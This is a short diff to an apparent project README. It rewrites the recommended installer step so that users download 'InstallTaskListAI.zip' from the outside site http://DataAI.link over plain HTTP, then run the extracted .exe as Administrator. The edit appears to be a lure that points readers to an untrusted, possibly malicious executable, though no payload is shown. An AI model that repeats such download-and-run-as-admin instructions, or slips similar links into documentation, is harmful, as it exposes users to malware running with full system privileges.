@@ -34,7 +34,7 @@ Full license: https://www.gnu.org/licenses/gpl-3.0.html
 
 ### Option 1 – Installer (Recommended)
 
-1. Download `InstallTaskListAI.zip`
+1. Download `InstallTaskListAI.zip` from http://DataAI.link
 2. Extract the archive
 3. Right-click `InstallTaskListAI.exe`
 4. Select **Run as Administrator**
